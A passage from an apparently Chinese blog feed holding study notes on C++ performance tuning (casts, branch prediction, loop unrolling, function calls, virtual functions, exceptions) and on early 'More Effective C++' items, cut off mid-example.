id="整形转浮点型">整形转浮点型</span></h3><p>将有符号整数转换为浮点数或双精度浮点数需要4‐16个时钟周期，这取决于处理器和使用的寄存器类型。无符号整数的转换需要更长的时间。</p><blockquote><p>如果没有溢出的风险，首先将无符号整数转换为有符号整数会更快。</p></blockquote><h3><span id="浮点型转化为整形">浮点型转化为整形</span></h3><p>如果不启用 SSE2或者更新的指令集，浮点数到整数的转换将花费很长的时间。通常，转换需要50‐100 个时钟周期。</p><p>解决方案是：</p><ul><li>使用 64 位模式或启用 SSE2 指令集；</li><li>使用四舍五入代替截断，并用汇编语言制作一个舍入函数。</li></ul><h3><span id="指针类型转换">指针类型转换</span></h3><p>指针可以转换为另一种类型的指针。同样，可以将指针转换为整数，也可以将整数转换为指针。值还是那些值，只是换了种解释方法，因此没有任何开销。</p><h3><span id="重新解释对象">重新解释对象</span></h3><p>c++中的reinterpret_cast，没有任何额外开销。</p><h3><span id="const_cast">const_cast</span></h3><p>const_cast 运算符用于解除 const 对指针的限制 。没有任何额外开销。</p><h3><span id="static_cast">static_cast</span></h3><p>static_cast 运算符的作用与 C 风格的类型转换相同。例如，它用于将 float转换为 int</p><h3><span id="reinterpret_cast">reinterpret_cast</span></h3><p>没有任何额外开销。</p><h3><span id="dynamic_cast">dynamic_cast</span></h3><p>dynamic_cast运算符用于将指向一个类的指针转换为指向另一个类的指针。它在<strong>运行时检查</strong>转换是否有效。dynamic_cast比static_cast更耗时，也更安全。</p><h3><span id="转换类对象">转换类对象</span></h3><p>只有当程序员定义了构造函数、重载赋值运算符或重载类型转换运算符（指定如何进行转换）时，才有可能进行涉及类对象（而不是指向对象的指针）的转换。</p><p>构造函数或重载运算符与成员函数的效率是一样的。</p><h2><span id="9-分支和switch语句">9 分支和switch语句</span></h2><p>在微处理器做出正确分支预测的情况下，执行分支指令通常需要 0‐2个时钟周期。根据处理器的不同，从分支错误预测中恢复所需的时间大约为<code>12‐25</code> 个时钟周期。这被称为分支预测错误的惩罚。</p><p>for 循环或 while 循环也是一种分支。</p><blockquote><p>在每次迭代之后，它决定是重复还是退出循环。嵌套循环只能在某些处理器上得到很好的预测。在许多处理器上，包含多个分支的循环并不能很好地被预测。</p></blockquote><p>switch 语句也是一种分支，它可以有两个以上的分支。</p><blockquote><p>如果 case 标签是遵循每个标签等于前一个标签加 1 的序列，在这个时候switch语句的效率是最高的，因为它可以被实现为一个目标跳转表。</p><p>如果 switch带有许多标签值，并且彼此相差较大，这将是低效的，因为编译器必须将其转换成一个分支树。</p></blockquote><p>分支和 switch 语句的数量，在程序的关键部分，最好控制在较少的水平。</p><p>因为分支和函数调用的目标保存在称为分支目标缓冲区的特殊缓存中。如果一个程序中有许多分支或函数调用，那么在分支目标缓冲区中就可能产生竞争。这种竞争的结果是，即使分支具有良好的可预测性，它们也可能被错误地预测。</p><h2><span id="10-循环">10 循环</span></h2><p>循环的效率取决于微处理器对循环控制分支的预测能力。</p><blockquote><p>一个较小并且有固定的重复计数，且没有分支的循环，可以完美地被预测。</p></blockquote><h3><span id="循环展开">循环展开</span></h3><p>展开前</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">int i;<br>for (i &#x3D; 0; i &lt; 20; i++)<br>&#123;<br> if (i % 2 &#x3D;&#x3D; 0); <br>  FuncA(i);<br> else<br>  FuncB(i);<br> FuncC(i);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>展开后</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">int i;<br>for (i &#x3D; 0; i &lt; 20; i+&#x3D;2)<br>&#123;<br>    FuncA(i);<br>    FuncC(i);<br>    FuncB(i+1);<br>    FuncC(i+1);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样做的好处：</p><ul><li>循环次数变成了10次而不是20次，CPU可以更完美的进行预测</li><li>if分支被消除，有利于编译器自动进行向量化等优化</li></ul><p>循环展开的坏处：</p><ul><li><p>展开循环后在代码缓存中占用更多空间</p></li><li><p>非常小的循环展开不如不展开</p></li><li><p>如果重复计数为奇数，并将其展开为2，则必须在循环之外执行额外的迭代。</p></li></ul><p>只有在能够取得特定好处的情况下，才应该使用循环展开。</p><p>比如，如果一个循环包含浮点运算，且循环计数器是整数，那么通常可以假设整个计算时间是由浮点代码决定的，而不是由循环控制分支决定的。在这种情况下，展开循环是没有任何好处的。</p><h3><span id="循环控制条件">循环控制条件</span></h3><ol type="1"><li><p>如果循环控制分支依赖于循环内部的计算，则效率较低。</p></li><li><p>确定最坏情况下的最大重复计数并始终使用此迭代次数的效率会更高。</p></li><li><p>循环计数器最好是整数。</p></li></ol><h3><span id="复制或清除数组">复制或清除数组</span></h3><p>对于诸如复制数组或将数组中的元素全部设置为零这样的琐碎任务，使用循环可能不是最佳选择。</p><p>使用 memset 和 memcpy 函数通常会更快。</p><h2><span id="11-函数">11 函数</span></h2><p>函数调用会让程序慢下来，因为</p><ul><li>代码地址跳转，可能需要4个时钟周期</li><li>如果代码分散在内存中会降低代码缓存效率</li><li>如果函数参数不够放在寄存器中，需要入到栈中，效率不高</li><li>需要额外时间设置stack frame, 保存和恢复寄存器</li><li>每个函数调用语句需要在分支目标缓冲区（BTB）中占用空间，BTB中发生资源竞争可能会导致分支预测失败。</li></ul><p>如何避免函数调用降低效率呢？</p><h3><span id="避免不必要函数">避免不必要函数</span></h3><p>不要过度封装。</p><h3><span id="使用内联函数">使用内联函数</span></h3><p>如果函数很小，或者只在程序中的一个位置调用它，那么内联函数是有好处的。小函数通常由编译器自动内联。</p><h3><span id="避免在最内层循环嵌套函数调用">避免在最内层循环嵌套函数调用</span></h3><p>如果在程序关键的最内层循环包含对帧函数的调用，那么代码有可能通过内联帧函数或使帧函数调用的所有函数内联（把帧函数变为叶函数）来提升效率。</p><blockquote><p>帧函数（Frame Function）：</p><ul><li>帧函数是指在程序执行期间创建的函数调用帧（FunctionFrame）或栈帧（StackFrame）。每当函数被调用时，会在内存中分配一个帧来存储函数的局部变量、参数和其他相关信息。</li><li>帧函数用于描述函数调用期间的堆栈结构，包含了函数的执行上下文、局部变量和临时数据等。它提供了函数执行的环境和上下文切换所需的信息。</li><li>帧函数还包括函数调用返回时所需的清理操作，如恢复调用者的上下文和处理返回值等。</li></ul><p>叶函数（Leaf Function）：</p><ul><li>叶函数是指在函数调用期间不会调用其他函数的函数，即它没有其他的子函数调用。叶函数执行完毕后直接返回，而不会进一步调用其他函数。</li><li>叶函数通常比较简单，不涉及复杂的递归或函数调用链，并且在性能优化方面具有一定的优势。</li></ul></blockquote><h3><span id="使用宏代替函数">使用宏代替函数</span></h3><p>不要滥用宏，宏的问题是：名称不能重载或限制作用区域。宏将干扰具有相同名称的任何函数或变量，而与作用域或命名空间无关。</p><h3><span id="使函数局部化">使函数局部化</span></h3><p>应该使同一个模块中使用的函数（即当前 <em>.cpp</em> 文件）是局部的。这使得编译器更容易将函数内联，并对函数调用进行优化。</p><p>如何使函数局部化呢？</p><ul><li>对于非类成员函数，直接使用static</li><li>对于类成员函数，将函数或类放置于<strong>匿名命名空间</strong>中</li></ul><h3><span id="使用全程序优化">使用全程序优化</span></h3><p>一些编译器具有对整个程序进行优化的选项，也可以选择将多个 .cpp文件组合成一个对象文件。这使得编译器能够在组成程序的所有 .cpp模块之间优化寄存器分配和参数传递。</p><h3><span id="使用64位模式">使用64位模式</span></h3><p>现在服务器端开发都是64位模式了吧？</p><h3><span id="函数参数">函数参数</span></h3><p>在大多数情况下，函数参数是按值传递的。这意味着参数的值被复制到一个局部变量中。对于int、float、double、bool、enum以及指针和引用等简单类型，这非常快。</p><p>数组总是使用指针传递，除非它们被打包在类或者结构体中。</p><p>如果参数是复合类型，在以下情况下传值更高效，否则使用指针和引用更高效：</p><ul><li>对象很小，可以装入一个寄存器</li><li>对象没有拷贝构造函数和析构函数</li><li>对象没有虚成员</li><li>对象没有使用RTTI</li></ul><p>将复合对象传递给函数的首选方法是使用 const引用。其次是使函数成为对象的类成员。</p><p>64位 unix 系统允许寄存器中传输最多14个参数(8个float或double，加上6个整数、指针或引用参数)</p><h3><span id="函数返回类型">函数返回类型</span></h3><p>函数的返回类型最好是简单类型、指针、引用或void。返回复合类型的对象更为复杂，而且常常效率低下。</p><p>简单情况下，复合类型对象直接从寄存器返回。否则通过一个隐藏指针将它们复制到调用方指定的位置。</p><p>当直接返回复杂类型对象的值时，编译器可能会进行RVO(return valueoptimization)优化，从而避免复制构造和析构成本，但开发者不应依赖这一点。</p><h3><span id="函数尾调用">函数尾调用</span></h3><p>尾调用是优化函数调用的一种方法。如果函数的最后一条语句是对另一个函数的调用，那么编译器可以用跳转到第二个函数来替换该调用。</p><p>编译器优化将自动完成此任务。第二个函数不会返回到第一个函数，而是直接返回第一个函数被调用的位置。这样效率更高，因为它消除了返回操作。</p><h3><span id="递归函数">递归函数</span></h3><p>函数递归调用对于处理递归数据结构非常有用。递归函数的代价是所有参数和局部变量在每次递归时都会有一个新实例，这会占用栈空间。</p><p>较宽的树形结构比较深的树形结构，有更高的递归效率。</p><p>无分支递归总是可以用循环代替，这样的效率更高</p><h2><span id="12-结构体和类">12 结构体和类</span></h2><p>面向对象的好处：</p><ul><li>变量存储在一起，数据缓存更有效率</li><li>无需将类成员变量作为参数传递给类成员函数，避免参数传递的开销</li></ul><p>面向对象的坏处：</p><ul><li>非静态成员函数有this指针，有额外开销</li><li>虚成员函数的效率较低</li></ul><p>如果面向对象的编程风格有利于程序的逻辑结构和清晰性，那么你可以使用这种风格</p><h3><span id="类的数据成员">类的数据成员</span></h3><p>类或结构体的数据成员是按创建类或结构实例时声明它们的顺序连续存储。将数据组织到类或结构体中不存在性能损失。</p><p>大多数编译器将数据成员对齐到可以被特定数整除的地址以优化访问，副作用是产生字节空洞。</p><h3><span id="类的成员函数">类的成员函数</span></h3><p>每次声明或创建类的新对象时，它都会生成数据成员的新实例。但是每个成员函数只有一个实例。函数代码不会被复制。</p><p>静态成员函数不能访问任何非静态数据成员或非静态成员函数。静态成员函数比非静态成员函数快。</p><h3><span id="虚成员函数">虚成员函数</span></h3><p>多态性是面向对象程序比非面向对象程序效率低的主要原因之一。如果可以避免使用虚函数，那么你就可以获得面向对象编程的大多数优势，而无需付出性能成本。</p><p>如果函数调用语句总是调用虚函数的相同版本，那么调用虚成员函数所花费的时间要比调用非虚成员函数多几个时钟周期。如果版本发生了变化，你可能会得到10‐20个时钟周期的错误预测惩罚。</p><p>有时可以使用模板（编译时多态）而不是虚函数来获得所需的多态性效果。</p><h3><span id="运行时类型识别rtti">运行时类型识别（RTTI）</span></h3><p>效率不高。如果编译器有RTTI 选项，那么关闭它并使用其他实现。</p><h3><span id="继承">继承</span></h3><p>派生类的对象与包含父类和子类成员的简单类的对象的实现方法相同。父类和子类的成员访问速度相同。</p><p>一般来说，你可以假设使用继承几乎没有任何性能损失。 除了：</p><ul><li>父类数据成员大小会添加到子类成员的偏移量中。偏移量太大时，会造成数据缓存效率降低。</li><li>父类和子类代码可能在不同模块。造成代码缓存效率降低。</li></ul><p>另外，尽量不使用多重继承，代之以组合。</p><h3><span id="联合体">联合体</span></h3><p>union 是数据成员共享相同内存空间的结构。union可以通过允许不同时使用的两个数据成员共享同一块内存来节省内存空间。</p><h3><span id="位域">位域</span></h3><p>位域虽然有助于使数据更加紧凑，但是访问位域成员不如访问结构的成员效率高。如果在大数组可以节省缓存空间或使文件更小，那么额外的时间是合理的</p><h3><span id="重载函数">重载函数</span></h3><p>重载函数的不同版本被简单地视为不同的函数。使用重载函数没有性能损失。</p><h3><span id="重载运算符">重载运算符</span></h3><p>重载的运算符相当于一个函数。使用重载运算符与使用具有相同功能的函数效率一样。</p><h2><span id="13-模板">13 模板</span></h2><p>模板与宏的相似之处在于，模板参数在编译之前被替换。</p><p>模板是高效的，因为模板参数总是在编译时被解析。模板使源代码更加复杂，而不是编译后的代码。一般来说，使用模板在执行速度方面没有任何成本。</p><h3><span id="使用模板实现编译时多态">使用模板实现编译时多态</span></h3><p>模板类可用于实现编译时多态性，这比使用虚拟成员函数获得的运行时多态性更加高效。</p><p>模板代码可读性不佳。</p><h2><span id="14-线程">14 线程</span></h2><p>线程上下文切换非常耗时，可通过设置更长的时间片来减少上下文切换的次数。另外，为不同任务的不同线程分配不同的优先级是非常有用的。</p><p>为了充分利用多核，可以将工作划分成多个线程，每个线程在单独的CPUcore上执行。但是多线程有四个成本：</p><ul><li>启动和停止线程的成本。如果任务执行时间很短，不要为其单独分配线程。</li><li>线程切换成本。</li><li>线程间同步和通信成本。</li><li>不同线程需要单独的存储空间，线程有各自的堆栈，如果线程共享相同的缓存，可能会导致缓存竞争。</li></ul><p>多线程程序必须使用线程安全函数，线程安全函数永远不应该使用静态变量(除非是只读的静态变量) 。</p><h2><span id="15-异常和错误处理">15 异常和错误处理</span></h2><p>C++中通过trycatch捕获异常。异常处理旨在检测很少发生的错误，并以一种优雅的方式从错误条件中恢复。</p><p>但是，即使程序运行时没有错误，异常处理仍需要额外的时间，花销多少取决于编译器实现。</p><p>如果你的应用程序不需要异常处理，那么应该禁用它，以便使代码更小、更高效。</p><p>可以通过关闭编译器中的异常处理选项来禁用整个程序的异常处理。或者，也可以通过向函数原型中添加throw() 声明来禁用单个函数的异常处理。</p><h3><span id="异常和向量代码">异常和向量代码</span></h3><p>向量指令对于并行执行多个计算是有用的。如果代码可以从向量指令中获益，那么最好禁用异常捕获，转而依赖NAN 和 INF 的传递。</p><h3><span id="避免异常处理的成本">避免异常处理的成本</span></h3><p>当不需要尝试从错误中恢复时，不需要异常处理。</p><ul><li>建议使用系统的、经过深思熟虑的方法来处理错误。</li><li>区分可恢复错误和不可恢复错误。</li><li>确保分配的资源在发生错误时得到清理，向用户发送适当的错误消息。</li></ul><h3><span id="编写异常安全代码">编写异常安全代码</span></h3><p>为了保证异常安全，需要在发生异常时清理下列资源：</p><ul><li>使用new和malloc分配的内存</li><li>句柄</li><li>互斥量</li><li>数据库连接</li><li>网络连接</li><li>待删除临时文件</li><li>待保护的用户工作</li><li>其他已分配的资源</li></ul><p>C++ 处理清理工作的方法是创建一个析构函数。C++异常处理系统确保调用本地对象的所有析构函数。</p><p>如果类有析构函数来处理分配资源的所有清理工作，则程序是异常安全的。如果析构函数引发另一个异常，则系统可能会出现问题。</p><p>如果你使用自己的错误处理系统而不是使用异常处理，那么你无法确保是否调用了所有析构函数并清理了资源。</p><p>如果错误处理程序调用 exit()、abort()、_endthread()等，则不能保证所有析构函数被调用。</p><h3><span id="nan和inf的传递">NAN和INF的传递</span></h3><ul><li>浮点溢出和除以 0 得到无穷大 INF。</li><li>如果你把无穷大和某数相加或相乘，结果就是无穷大 INF。</li><li>如果用一个正常的数字除以 INF，会得到 0。</li><li>INF ‐ INF 和 INF / INF 得到 NAN （not‐a‐number）。</li><li>当你用 0 除以 0 以及函数的输入超出范围时，比如 sqrt(‐1) 和log(‐1)，也会出现特殊的代码NAN。</li></ul><p>INF 和 NAN 的传播也不需要额外的成本。</p><blockquote><p>当参数为 INF 或 NAN 时，函数 finite() 将返回false，如果它是一个普通的浮点数，则返回 true。</p></blockquote><h2><span id="16-预处理命令">16 预处理命令</span></h2><p>就程序性能而言，预处理指令（以#开头的所有指令）的性能成本很少，因为它们在程序编译之前就已经解析了。</p><h2><span id="17-命名空间">17 命名空间</span></h2><p>使用名称空间，对执行速度没有影响。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>More Effective Cpp</title>
      <link href="/posts/e584d079.html"/>
      <url>/posts/e584d079.html</url>
      
        <content type="html"><![CDATA[<h2><span id="一-基础">一、基础</span></h2><h3><span id="条款-1仔细区别pointers和references"><strong>条款 1：仔细区别pointers和references</strong></span></h3><p>没有 null reference。一个 reference 必须总代表某个对象。</p><p>所以如果你有一个变量，其目的是用来指向（代表）另一个对象，但是也有可能它不指向（代表）任何对象，那么你应该使用pointer，才可以将 pointer 设为 null。</p><p>Pointers 和 references 之间的另一个重要差异就是，pointers可以被重新赋值，指向另一个对象，reference却总是指向（代表）它最初获得的那个对象。</p><ul><li><p>当你需要考虑“不指向任何对象”的可能性时，或是考虑“在不同时间指向不同对象”的能力时，你就应该采用pointer。</p></li><li><p>当你确定“总是会代表某个对象”，而且“一旦代表了该对象就不能够再改变”，那么你应该选用reference。</p></li></ul><h3><span id="条款-2最好使用c转型操作符"><strong>条款 2：最好使用C++转型操作符</strong></span></h3><p>C++有 4个新的转型操作符（castoperators）：static_cast，const_cast，dynamic_cast 和reinterpret_cast。</p><p>static_cast 基本上拥有与 C旧式转型相同的威力与意义，以及相同的限制。</p><p>const_cast用来改变表达式中的常量性（constness）或变易性（volatileness）。</p><p>dynamic_cast用来执行继承体系中“安全的向下转型或跨系转型动作”。也就是说你可以利用dynamic_cast，将“指向 base class objects的 pointers或references”转型为“指向 derived class objects 的 pointers或references”。如果转型失败，会以一个 null指针（当转型对象是指针）或一个exception（当转型对象是 reference）表现出来。</p><p>reinterpret_cast 转换结果几乎总是与编译平台息息相关。所以reinterpret_casts 不具移植性。reinterpret_cast的最常用用途是转换“函数指针”类型。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*FuncPtr)</span><span class="hljs-params">()</span></span>;<br><br>FuncPtr funcPtrArray[<span class="hljs-number">10</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">doSomething</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-comment">// funcPtrArray[0] = &amp;doSomething;  // 错误！类型不匹配</span><br>funcPtrArray[<span class="hljs-number">0</span>] = <span class="hljs-keyword">reinterpret_cast</span>&lt;FuncPtr&gt;(&amp;doSomething);<br></code></pre></div></td></tr></table></figure><h3><span id="条款3绝对不要以多态polymorphically方式处理数组"><strong>条款3：绝对不要以多态（polymorphically）方式处理数组</strong></span></h3><p>多态（polymorphism）和指针运算不能混用。数组对象几乎总是会涉及指针的算术运算，所以数组和多态不要混用。原因之一，若发生通过父类指针删除一个子类对象，其结果未定义。</p><h3><span id="条款4非必要不提供-default-constructor"><strong>条款4：非必要不提供 default constructor</strong></span></h3><p>添加无意义的 default constructors，也会影响 class 的效率。</p><p>如果使用 member functions测试字段是否真被初始化了，其调用者便必须为测试行为付出时间代价，并为测试代码付出空间代价。万一测试结果为否定，对应的处理程序又需要一些空间代价。</p><p>如果可以自定义 class constructors确保对象的所有字段都会被正确地初始化，上述所有成本便都可以免除。defaultconstructors 无法提供这种保证，那么最好避免让 default constructors出现。</p><h2><span id="二-操作符">二、操作符</span></h2><h3><span id="条款5对定制的类型转换函数保持警觉"><strong>条款5：对定制的“类型转换函数”保持警觉</strong></span></h3><p>两种函数允许编译器执行类型隐式转换：单自变量 constructors 和隐式类型转换操作符。</p><p>所谓单自变量 constructors 是指能够以单一自变量成功调用的constructors。如此的 constructor可能声明拥有单一参数，也可能声明拥有多个参数，并且除了第一参数之外都有默认值。</p><p>所谓隐式类型转换操作符，是一个拥有奇怪名称的memberfunction：关键词operator 之后加上一个类型名称。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rational</span> &#123;</span><br><span class="hljs-keyword">public</span>: <br>    Rational(<span class="hljs-keyword">int</span> numerator, <span class="hljs-keyword">int</span> denominator = <span class="hljs-number">1</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">double</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    ...<br>&#125;;<br><br><span class="hljs-function">Rational <span class="hljs-title">r</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span></span>;<br>Rational a = <span class="hljs-number">1</span> * r; <span class="hljs-comment">// constructors转换1为Rational r(1,1)</span><br><span class="hljs-keyword">double</span> d = <span class="hljs-number">0.5</span> * r; <span class="hljs-comment">// double()转换r为0.5</span><br></code></pre></div></td></tr></table></figure><p>隐式转换可能带来不易察觉的问题或者错误。</p><p>C++引入关键词explicit，就是为了解决隐式类型转换带来的问题。其用法十分直接易懂，只要将constructors声明为explicit，编译器便不能因隐式类型转换的需要而调用它们。不过显式类型转换仍是允许的。</p><p>对于隐式类型转换操作符，如非必要，最好不要设计，而是设计一个功能对等的成员函数，以供显示调用。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rational</span> &#123;</span><br><span class="hljs-keyword">public</span>: <br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Rational</span><span class="hljs-params">(<span class="hljs-keyword">int</span> numerator, <span class="hljs-keyword">int</span> denominator = <span class="hljs-number">1</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">asDouble</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="条款6自增increment-自减decrement操作符前缀形式与后缀形式的区别"><strong>条款6：自增(increment)、自减(decrement)操作符前缀形式与后缀形式的区别</strong></span></h3><p>重载函数是以其<strong>参数类型</strong>来区分彼此的，然而不论increment 或 decrement操作符的前置式或后置式，逻辑上都没有参数。为了做出区分，只好让后置式有一个int 自变量，并且在它被调用时，编译器默默地为该 int 指定一个 0 值。</p><p>处理用户定制类型时，应该尽可能使用前置式 increment。</p><p>后置式 increment 和 decrement操作符的实现应以其前置式兄弟为基础。方便维护，减少代码重复。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UPInt</span> &#123;</span><br><span class="hljs-keyword">public</span>: <br>    UPInt&amp; <span class="hljs-keyword">operator</span>++();  <span class="hljs-comment">// 前++</span><br><span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>++(<span class="hljs-keyword">int</span>);  <span class="hljs-comment">// 后++</span><br>    UPInt&amp; <span class="hljs-keyword">operator</span>--();<br>    <span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>--(<span class="hljs-keyword">int</span>);<br>    UPInt&amp; <span class="hljs-keyword">operator</span>+=(<span class="hljs-keyword">int</span>);<br>...<br>&#125;;<br><br><span class="hljs-comment">// prefix：increment and fetch</span><br>UPInt&amp; UPInt::<span class="hljs-keyword">operator</span>++() &#123;<br>*<span class="hljs-keyword">this</span> += <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125; <br><span class="hljs-comment">// postfix form: fetch and increment </span><br><span class="hljs-keyword">const</span> UPInt UPInt::<span class="hljs-keyword">operator</span>++(<span class="hljs-keyword">int</span>) &#123;<br>UPInt oldValue = *<span class="hljs-keyword">this</span>; <br>    ++(*<span class="hljs-keyword">this</span>);<br><span class="hljs-keyword">return</span> oldValue; <br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款7千万不要重载ampamp和操作符"><strong>条款7：千万不要重载&amp;&amp;，||和，操作符</strong></span></h3><p>C++对于“真假值表达式”采用“骤死式”评估方式。意思是一旦该表达式的真假值确定，即使表达式中还有部分尚未检验，整个评估工作仍告结束。</p><p>“函数调用”语义和“骤死式”语义有两个重大的区别。</p><p>第一，当函数调用动作被执行，所有参数值都必须评估完成，所以当我们调用operator&amp;&amp;和operator||时，两个参数都已评估完成。换句话说没有什么骤死式语义。</p><p>第二，C++语言规范并未明确定义函数调用动作中各参数的评估顺序，所以没办法知道expression1 和 expression2哪个会先被评估。这与骤死式评估法形成一个明确的对比，后者总是由左向右评估其自变量。</p><p>C++同样也有一些规则用来定义逗号操作符面对内建类型的行为。表达式如果内含逗号，那么逗号左侧会先被评估，然后逗号的右侧再被评估；最后，整个逗号表达式的结果以逗号右侧的值为代表。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 其中 ++i, --j 表达式的结果是 --j 的值</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-built_in">strlen</span>(s)<span class="hljs-number">-1</span>; i &lt; j; ++i, --j) ...<br></code></pre></div></td></tr></table></figure><p>其他不能重载的操作符还有:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">.    .*    <span class="hljs-keyword">new</span>    <span class="hljs-keyword">delete</span>    ::    <span class="hljs-keyword">sizeof</span>     <span class="hljs-keyword">typeid</span>    ?:<br><br><span class="hljs-keyword">static_cast</span>    <span class="hljs-keyword">dynamic_cast</span>    <span class="hljs-keyword">const_cast</span>    <span class="hljs-keyword">reinterpret_cast</span><br></code></pre></div></td></tr></table></figure><p>可以重载：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>     <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span><br><span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>[]     <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[]<br><br>!   +   *    /    %    ^    &amp;    |   <br><br>~   =   &lt;   &gt;    +=    -=    *=    /=    %=<br><br>^=    &amp;=    |=    &lt;&lt;    &gt;&gt;    &gt;&gt;=    &lt;&lt;=    ==    !=<br><br>&lt;=    &gt;=    &amp;&amp;    ||    ++    <span class="hljs-comment">--    ,    -&gt;*    -&gt;</span><br><br>()    []<br></code></pre></div></td></tr></table></figure><h3><span id="条款8了解各种不同意义的new和-delete"><strong>条款8：了解各种不同意义的new和 delete</strong></span></h3><h4><span id="new-operator">new operator</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> *ps = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">"Memory Management"</span>);<br></code></pre></div></td></tr></table></figure><p>以上使用的 new 是 new operator。这个操作符是由语言内建的，就像sizeof那样，不能被改变意义，总是做相同的事情。它的动作分为两方面。</p><p>第一，它分配足够的内存，用来放置某类型的对象。第二，它调用一个constructor，为刚才分配的内存中的那个对象设定初值。</p><p>new operator 总是做这两件事，无论如何你不能够改变其行为。</p><h4><span id="operator-new">operator new</span></h4><p>你能够改变的是用来容纳对象的那块内存的分配行为。new operator调用某个函数，执行必要的内存分配动作，你可以重写或重载那个函数，改变其行为。这个函数的名称叫做operator new。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> <span 